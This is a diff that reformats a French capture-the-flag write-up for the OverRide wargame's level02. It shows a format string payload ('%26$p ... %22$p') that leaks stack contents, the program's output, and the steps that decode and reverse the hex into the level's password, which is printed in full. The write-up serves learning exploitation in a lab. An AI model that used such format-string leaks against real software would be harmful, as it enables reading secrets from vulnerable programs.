@@ -1,4 +1,4 @@
-Solution :
+## Solution
 
 Dans le code source on peu constater plusieur point :
 
@@ -46,10 +46,11 @@ a8 = 168 bytes de distance
 
 le mot de passe fait fait une taille de 0x29 donc 41 en decimal, ce qui fait 5 print 
 
-payload :
-
+### Payload :
+```
 %26$p %25$p %24$p %23$p %22$p
-
+```
+```
 ----------------------------------------------------------------
 level02@OverRide:~$ ./level02 
 ===== [ Secure Access System v1.0 ] =====
@@ -60,12 +61,13 @@ level02@OverRide:~$ ./level02
 --[ Password: 
 *****************************************
 0x48336750664b394d 0x354a35686e475873 0x377a7143574e6758 0x45414a3561733951 0x756e505234376848 does not have access!
-
+```
 
 On retire les 0x et les espace :
-
+```
 48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848 -> in ASCII -> H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH
-
+```
 on inverse et cela donne :
-
+```
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
